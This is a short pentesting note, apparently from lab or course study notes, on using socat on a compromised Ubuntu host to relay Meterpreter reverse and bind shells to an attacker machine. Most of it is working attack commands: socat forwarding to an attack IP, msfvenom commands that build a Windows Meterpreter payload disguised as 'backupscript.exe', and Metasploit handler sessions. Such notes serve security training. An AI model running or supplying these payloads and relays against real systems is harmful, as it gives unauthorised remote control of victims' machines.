---
description: >-
  Socat is a bidirectional relay tool that can create pipe sockets between 2
  independent network channels without needing to use SSH tunneling
---

# Socat Redirection with a Reverse Shell

## Reverse Shell

**Starting Socat Listener**

<pre class="language-shell-session"><code class="lang-shell-session"><strong># socat TCP4-LISTEN:&#x3C;payload port>,fork TCP4:&#x3C;attackers IP>:&#x3C;attackers port>
</strong>ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
</code></pre>

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18)

**Creating the Windows Payload**

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

> Then transfer the payload to windows machine

**Configuring & Starting the multi/handler**

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

> Run the command in the target host, it will connect to our pivot server and the pivot server will forward the connection to us attack host.

## Bind Shell

Previously for reverse shell we start a listener on our attack machine but for bind shell we will start listener on host2 (windows) and we will make a connection on attackers machine which gets redirected by socat running on host1 (ubuntu).

**Creating the Windows Payload**

```shell-session
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

Then moved the payload and executed on the windows machine wating for the connection to be made.

**Starting Socat Bind Shell Listener**

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

**Configuring & Starting the Bind multi/handler**

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

